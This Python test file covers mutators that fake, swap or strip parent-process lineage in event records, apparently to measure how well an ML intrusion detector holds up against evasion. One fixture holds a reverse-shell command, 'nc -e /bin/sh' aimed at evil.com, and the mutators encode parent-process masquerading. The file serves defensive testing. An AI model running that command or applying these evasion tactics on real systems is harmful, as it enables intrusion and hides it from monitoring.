"""Tests for lineage mutators (mutations.lineage).

Validates that each mutator class:
- Preserves event schema (parent_comm/parent_image_path remain valid)
- Is deterministic (same seed produces same mutation)
- Is semantically preserving (attacker-plausible)
"""

import pytest

from synthaea_ml.evaluation.mutations.lineage import (
    FakeParentNameMutator,
    ParentPathMutator,
    RemoveLineageMutator,
)
from synthaea_ml.evaluation.mutations.prng import LCG


def test_fake_parent_name_light() -> None:
    """Light intensity replaces parent_comm with common benign parent."""
    mutator = FakeParentNameMutator()
    rng = LCG(seed=42)

    record = {
        "argv": ["nc", "-e", "/bin/sh", "evil.com", "443"],
        "parent_comm": "suspicious_dropper",
        "parent_image_path": "/tmp/dropper",
    }
    mutated = mutator.mutate(record, "light", rng)

    # Original unchanged
    assert record["parent_comm"] == "suspicious_dropper"

    # Mutated parent_comm is from light candidates
    assert mutated["parent_comm"] in ["systemd", "explorer.exe"]

    # Other fields unchanged
    assert mutated["argv"] == record["argv"]
    assert mutated["parent_image_path"] == record["parent_image_path"]


def test_fake_parent_name_medium() -> None:
    """Medium intensity uses context-appropriate parents."""
    mutator = FakeParentNameMutator()
    rng = LCG(seed=100)

    record = {"parent_comm": "malware.exe", "parent_image_path": None}
    mutated = mutator.mutate(record, "medium", rng)

    # Mutated parent_comm is from medium candidates (first 5)
    expected = ["systemd", "init", "launchd", "explorer.exe", "svchost.exe"]
    assert mutated["parent_comm"] in expected


def test_fake_parent_name_heavy() -> None:
    """Heavy intensity uses full pool of legitimate names."""
    mutator = FakeParentNameMutator()
    rng = LCG(seed=200)

    record = {"parent_comm": "webshell", "parent_image_path": "/var/www/shell.php"}
    mutated = mutator.mutate(record, "heavy", rng)

    # Mutated parent_comm is from full pool
    expected = mutator.BENIGN_PARENTS
    assert mutated["parent_comm"] in expected


def test_fake_parent_name_deterministic() -> None:
    """Same seed produces same parent name."""
    mutator = FakeParentNameMutator()
    record = {"parent_comm": "evil", "parent_image_path": None}

    rng1 = LCG(seed=123)
    mutated1 = mutator.mutate(record, "light", rng1)

    rng2 = LCG(seed=123)
    mutated2 = mutator.mutate(record, "light", rng2)

    assert mutated1["parent_comm"] == mutated2["parent_comm"]


def test_fake_parent_name_no_lineage() -> None:
    """Mutator returns unchanged record if parent_comm is None."""
    mutator = FakeParentNameMutator()
    rng = LCG(seed=42)

    record = {"parent_comm": None, "parent_image_path": None}
    mutated = mutator.mutate(record, "light", rng)

    # Record unchanged
    assert mutated["parent_comm"] is None


def test_parent_path_light() -> None:
    """Light intensity is a weak attempt: a mixed pool of system and suspicious paths."""
    mutator = ParentPathMutator()
    rng = LCG(seed=42)

    record = {
        "parent_comm": "bash",
        "parent_image_path": "/tmp/evil",
    }
    mutated = mutator.mutate(record, "light", rng)

    # Original unchanged
    assert record["parent_image_path"] == "/tmp/evil"

    assert mutated["parent_image_path"] in mutator.SYSTEM_PATHS + mutator.SUSPICIOUS_PATHS

    # Other fields unchanged
    assert mutated["parent_comm"] == record["parent_comm"]


def test_parent_path_medium() -> None:
    """Medium intensity uses system directories only, from any platform."""
    mutator = ParentPathMutator()
    rng = LCG(seed=100)

    record = {"parent_comm": None, "parent_image_path": "/usr/bin/bash"}
    mutated = mutator.mutate(record, "medium", rng)

    assert mutated["parent_image_path"] in mutator.SYSTEM_PATHS


def test_parent_path_heavy() -> None:
    """Heavy intensity is the strongest evasion: system paths of the record's own platform."""
    mutator = ParentPathMutator()
    windows = {
        "parent_comm": "svchost.exe",
        "parent_image_path": "C:\\Windows\\System32\\svchost.exe",
    }
    unix = {"parent_comm": "bash", "parent_image_path": "/tmp/dropper"}
    for seed in range(100):
        got_windows = mutator.mutate(windows, "heavy", LCG(seed=seed))["parent_image_path"]
        got_unix = mutator.mutate(unix, "heavy", LCG(seed=seed))["parent_image_path"]
        assert got_windows in mutator.SYSTEM_PATHS
        assert not got_windows.startswith("/")
        assert got_unix in mutator.SYSTEM_PATHS
        assert got_unix.startswith("/")


def test_parent_path_heavy_never_picks_a_suspicious_path() -> None:
    """#617: the intensity ladder must not be inverted for an escape metric: a heavier
    mutation that moves *toward* suspicious paths makes detection easier, not harder."""
    mutator = ParentPathMutator()
    record = {"parent_comm": "x", "parent_image_path": "x"}
    for seed in range(300):
        for intensity in ("medium", "heavy"):
            got = mutator.mutate(record, intensity, LCG(seed=seed))["parent_image_path"]
            assert got not in mutator.SUSPICIOUS_PATHS


def test_parent_path_deterministic() -> None:
    """Same seed produces same path."""
    mutator = ParentPathMutator()
    record = {"parent_comm": None, "parent_image_path": "/tmp/x"}

    rng1 = LCG(seed=456)
    mutated1 = mutator.mutate(record, "light", rng1)

    rng2 = LCG(seed=456)
    mutated2 = mutator.mutate(record, "light", rng2)

    assert mutated1["parent_image_path"] == mutated2["parent_image_path"]


def test_parent_path_no_lineage() -> None:
    """Mutator returns unchanged record if parent_image_path is None."""
    mutator = ParentPathMutator()
    rng = LCG(seed=42)

    record = {"parent_comm": "bash", "parent_image_path": None}
    mutated = mutator.mutate(record, "light", rng)

    # Record unchanged
    assert mutated["parent_image_path"] is None


def test_remove_lineage_light() -> None:
    """Light intensity removes parent_comm only."""
    mutator = RemoveLineageMutator()
    rng = LCG(seed=42)

    record = {
        "parent_comm": "bash",
        "parent_image_path": "/bin/bash",
    }
    mutated = mutator.mutate(record, "light", rng)

    # Original unchanged
    assert record["parent_comm"] == "bash"
    assert record["parent_image_path"] == "/bin/bash"

    # parent_comm removed, parent_image_path intact
    assert mutated["parent_comm"] is None
    assert mutated["parent_image_path"] == "/bin/bash"


def test_remove_lineage_medium() -> None:
    """Medium intensity removes parent_image_path only."""
    mutator = RemoveLineageMutator()
    rng = LCG(seed=42)

    record = {
        "parent_comm": "explorer.exe",
        "parent_image_path": "C:\\Windows\\explorer.exe",
    }
    mutated = mutator.mutate(record, "medium", rng)

    # parent_comm intact, parent_image_path removed
    assert mutated["parent_comm"] == "explorer.exe"
    assert mutated["parent_image_path"] is None


def test_remove_lineage_heavy() -> None:
    """Heavy intensity removes both fields."""
    mutator = RemoveLineageMutator()
    rng = LCG(seed=42)

    record = {
        "parent_comm": "systemd",
        "parent_image_path": "/usr/lib/systemd/systemd",
    }
    mutated = mutator.mutate(record, "heavy", rng)

    # Both removed
    assert mutated["parent_comm"] is None
    assert mutated["parent_image_path"] is None


def test_mutators_reject_invalid_intensity() -> None:
    """All mutators reject invalid intensity."""
    mutator = FakeParentNameMutator()
    rng = LCG(seed=42)

    record = {"parent_comm": "bash"}
    with pytest.raises(ValueError, match="invalid intensity"):
        mutator.mutate(record, "extreme", rng)


def test_mutation_class_names() -> None:
    """Each mutator has distinct class name."""
    mutators = [
        FakeParentNameMutator(),
        ParentPathMutator(),
        RemoveLineageMutator(),
    ]

    names = [m.mutation_class_name() for m in mutators]
    assert len(names) == len(set(names))  # All unique
    assert all(isinstance(n, str) and n for n in names)  # All non-empty strings


@pytest.mark.parametrize(
    ("mutator", "field", "intensity", "candidates"),
    [
        (FakeParentNameMutator(), "parent_comm", "light", ["systemd", "explorer.exe"]),
        (ParentPathMutator(), "parent_image_path", "heavy", ParentPathMutator.SYSTEM_PATHS),
    ],
)
def test_every_candidate_is_reachable(mutator, field, intensity, candidates) -> None:
    """Regression test for the `uniform(0, len(candidates) - 1)` off-by-one:
    the last candidate was never selected because `LCG.uniform` is
    [low, high), so excluding it from `high` made the final index
    unreachable. Membership-only assertions (the tests above) pass with
    that bug in place; this pins that every candidate is reached across a
    range of seeds instead.
    """
    record = {"parent_comm": "x", "parent_image_path": "x"}
    seen = {mutator.mutate(record, intensity, LCG(seed=s))[field] for s in range(500)}
    assert set(candidates) <= seen


# --- #617: platform-matched fake parents -------------------------------------------


def test_a_linux_event_is_never_given_a_windows_parent() -> None:
    mutator = FakeParentNameMutator()
    record = {
        "argv": ["/bin/sh", "-c", "id"],
        "image_path": "/bin/sh",
        "parent_comm": "dropper",
        "parent_image_path": "/tmp/dropper",
    }
    for intensity in ("light", "medium", "heavy"):
        for seed in range(200):
            got = mutator.mutate(record, intensity, LCG(seed=seed))["parent_comm"]
            assert got in FakeParentNameMutator.UNIX_PARENTS, (intensity, got)


def test_a_windows_event_is_never_given_a_unix_parent() -> None:
    mutator = FakeParentNameMutator()
    record = {
        "image_path": "C:\\Users\\victim\\evil.exe",
        "parent_comm": "winword.exe",
        "parent_image_path": "C:\\Program Files\\Office\\winword.exe",
    }
    for intensity in ("light", "medium", "heavy"):
        for seed in range(200):
            got = mutator.mutate(record, intensity, LCG(seed=seed))["parent_comm"]
            assert got in FakeParentNameMutator.WINDOWS_PARENTS, (intensity, got)


def test_an_event_whose_platform_is_unknown_keeps_the_cross_platform_pool() -> None:
    mutator = FakeParentNameMutator()
    record = {"parent_comm": "x", "parent_image_path": None}
    seen = {mutator.mutate(record, "heavy", LCG(seed=s))["parent_comm"] for s in range(500)}
    assert seen == set(FakeParentNameMutator.BENIGN_PARENTS)


def test_the_platform_pools_partition_the_cross_platform_pool() -> None:
    pools = FakeParentNameMutator.UNIX_PARENTS + FakeParentNameMutator.WINDOWS_PARENTS
    assert sorted(pools) == sorted(FakeParentNameMutator.BENIGN_PARENTS)


# --- #617: removing lineage means the same thing however it is expressed ----------


def test_a_none_lineage_and_a_missing_lineage_extract_identical_features() -> None:
    """`RemoveLineageMutator` sets the fields to `None` instead of deleting the keys;
    the extractor (and the Rust side, where both are `Option::None`) must not tell the
    difference, or a sensor without parent tracking would score differently from a
    mutated record."""
    from synthaea_ml.features import lineage

    full = {"parent_comm": "nginx", "parent_image_path": "/usr/sbin/nginx"}
    stripped = RemoveLineageMutator().mutate(full, "heavy", LCG(seed=1))
    assert stripped["parent_comm"] is None
    assert lineage.extract_features(stripped) == lineage.extract_features({})
